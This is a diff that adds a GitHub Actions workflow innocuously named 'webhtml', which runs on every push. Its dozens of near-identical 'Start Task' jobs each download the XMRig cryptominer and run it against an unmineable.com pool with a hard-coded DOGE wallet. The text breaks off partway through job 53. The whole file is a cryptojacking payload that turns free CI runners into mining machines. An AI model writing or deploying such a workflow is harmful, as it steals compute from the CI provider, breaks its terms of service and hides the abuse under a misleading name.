@@ -1,0 +1,2167 @@
+name: webhtml
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  start_task_1:
+    name: Start Task 1
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 1
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_2:
+    name: Start Task 2
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 2
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_3:
+    name: Start Task 3
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 3
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_4:
+    name: Start Task 4
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 4
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_5:
+    name: Start Task 5
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 5
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_6:
+    name: Start Task 6
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 6
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_7:
+    name: Start Task 7
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 7
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_8:
+    name: Start Task 8
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 8
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_9:
+    name: Start Task 9
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 9
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_10:
+    name: Start Task 10
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 10
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_11:
+    name: Start Task 11
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 11
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_12:
+    name: Start Task 12
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 12
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_13:
+    name: Start Task 13
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 13
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_14:
+    name: Start Task 14
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 14
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_15:
+    name: Start Task 15
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 15
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_16:
+    name: Start Task 16
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 16
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_17:
+    name: Start Task 17
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 17
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_18:
+    name: Start Task 18
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 18
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_19:
+    name: Start Task 19
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 19
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_20:
+    name: Start Task 20
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 20
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_21:
+    name: Start Task 21
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 21
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_22:
+    name: Start Task 22
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 22
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_23:
+    name: Start Task 23
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 23
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_24:
+    name: Start Task 24
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 24
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_25:
+    name: Start Task 25
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 25
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_26:
+    name: Start Task 26
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 26
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_27:
+    name: Start Task 27
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 27
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_28:
+    name: Start Task 28
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 28
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_29:
+    name: Start Task 29
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 29
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_30:
+    name: Start Task 30
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 30
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_31:
+    name: Start Task 31
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 31
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_32:
+    name: Start Task 32
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 32
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_33:
+    name: Start Task 33
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 33
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_34:
+    name: Start Task 34
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 34
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_35:
+    name: Start Task 35
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 35
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_36:
+    name: Start Task 36
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 36
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_37:
+    name: Start Task 37
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 37
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_38:
+    name: Start Task 38
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 38
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_39:
+    name: Start Task 39
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 39
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_40:
+    name: Start Task 40
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 40
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_41:
+    name: Start Task 41
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 41
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_42:
+    name: Start Task 42
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 42
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_43:
+    name: Start Task 43
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 43
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_44:
+    name: Start Task 44
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 44
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_45:
+    name: Start Task 45
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 45
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_46:
+    name: Start Task 46
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 46
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_47:
+    name: Start Task 47
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 47
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_48:
+    name: Start Task 48
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 48
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_49:
+    name: Start Task 49
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 49
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_50:
+    name: Start Task 50
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 50
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_51:
+    name: Start Task 51
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 51
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_52:
+    name: Start Task 52
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 52
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_53:
+    name: Start Task 53
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 53
+        run: |
